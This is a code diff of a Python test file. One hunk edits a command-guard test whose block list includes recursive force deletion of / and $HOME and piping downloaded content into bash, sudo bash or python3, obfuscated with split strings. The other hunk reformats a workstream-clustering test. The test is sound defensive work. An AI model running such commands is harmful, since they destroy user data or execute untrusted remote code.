@@ -1732,7 +1732,7 @@ const shown = formatDate('YYYY_MM_DD');
             f"{destructive} --recursive --force /",
             f"{destructive} -rf $HOME",
             f"{fetch} http://x/y | {shell}",
-            f"wg" + f"et -qO- http://x | sudo ba{shell}",
+            "wg" + f"et -qO- http://x | sudo ba{shell}",
             f"{fetch} http://x | python3",
         ]
         must_allow = [f"{destructive} -rf ./build", f"{destructive} file.txt", "git status", "npm run format"]
@@ -3267,7 +3267,12 @@ class WorkstreamClusteringTests(unittest.TestCase):
             self.tracker.record_issues(
                 root,
                 [
-                    {"title": "Alpha concern", "rule": "r1", "paths": ["src/a.ts"], "external": {"labels": ["backend"]}},
+                    {
+                        "title": "Alpha concern",
+                        "rule": "r1",
+                        "paths": ["src/a.ts"],
+                        "external": {"labels": ["backend"]},
+                    },
                     {
                         "title": "Totally separate matter",
                         "rule": "r2",
